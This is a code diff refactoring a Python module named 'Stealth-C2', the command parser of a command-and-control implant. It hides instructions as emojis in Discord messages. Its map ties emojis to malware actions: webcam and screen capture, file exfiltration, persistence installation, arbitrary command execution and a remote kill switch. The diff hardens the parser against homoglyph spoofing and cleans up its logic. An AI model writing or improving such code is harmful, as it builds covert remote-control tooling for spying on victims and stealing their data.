@@ -1,39 +1,38 @@
+"""
+Stealth-C2 — Steganographic Decoder
+Parses Discord messages for emoji-encoded commands.
+NFKC normalisation is applied first to block homoglyph spoofing.
+"""
+
+from __future__ import annotations
+
 import unicodedata
 
-# The Protocol
-EMOJI_MAP = {
-    '🐚': 'cmd_shell',      # System Info
-    '📸': 'cmd_screenshot', # Screenshot/Webcam
-    '👋': 'cmd_ping',       # Ping
-    '📂': 'cmd_exfil',      # Exfiltrate File
-    '🔄': 'cmd_persist',    # Install Persistence
-    '🛑': 'cmd_exit',       # Kill Switch
-    '⚡': 'cmd_exec',        # Remote Command Execution
-    '🔑': 'cmd_keygen',     # Key Rotation (V1.0 Key Management)
+EMOJI_MAP: dict[str, str] = {
+    "🐚": "cmd_shell",       # System info
+    "📸": "cmd_screenshot",  # Screen / webcam capture
+    "👋": "cmd_ping",        # Liveness check
+    "📂": "cmd_exfil",       # Encrypted file exfiltration
+    "🔄": "cmd_persist",     # Persistence installation
+    "🛑": "cmd_exit",        # Remote kill switch
+    "⚡": "cmd_exec",        # Arbitrary command execution
+    "🔑": "cmd_keygen",      # AES key rotation
 }
 
-def normalize_homoglyphs(text):
-    return unicodedata.normalize('NFKC', text)
 
-def extract_intent(message_content):
-    """
-    Returns a Tuple: (Command_ID, Argument_String)
-    """
-    clean_text = normalize_homoglyphs(message_content)
-    
+def normalize_homoglyphs(text: str) -> str:
+    return unicodedata.normalize("NFKC", text)
+
+
+def extract_intent(message_content: str) -> tuple[str, str | None] | None:
+    """Return (command_id, args) or None if no trigger is found."""
+    clean = normalize_homoglyphs(message_content)
+
     for emoji, cmd_id in EMOJI_MAP.items():
-        if emoji in clean_text:
-            # Split the message by the emoji
-            # Example: "⚡ ipconfig /all" -> ["", " ipconfig /all"]
-            try:
-                parts = clean_text.split(emoji, 1) # Split only on the first occurrence
-                if len(parts) > 1:
-                    args = parts[1].strip()
-                    if not args: args = None
-                    return (cmd_id, args)
-            except IndexError:
-                return (cmd_id, None)
-            
-            return (cmd_id, None)
-            
+        if emoji not in clean:
+            continue
+        parts = clean.split(emoji, maxsplit=1)
+        args  = parts[1].strip() if len(parts) > 1 and parts[1].strip() else None
+        return (cmd_id, args)
+
     return None
